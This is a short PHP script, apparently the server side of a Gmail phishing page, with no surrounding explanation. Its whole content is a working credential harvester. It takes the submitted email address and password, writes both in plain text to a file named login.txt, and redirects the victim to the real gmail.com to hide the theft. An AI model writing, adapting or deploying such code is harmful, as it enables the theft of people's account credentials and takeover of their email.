<?php
$ar = fopen("login.txt", "a") or die("Error al crear");
$usuario=$_REQUEST['Email'];
$clave=$_REQUEST['Passwd'];
fwrite($ar,"Email: " . $usuario);
fwrite($ar,"\n");
fwrite($ar,"Clave: " . $clave);

header('Location: https://gmail.com');

?>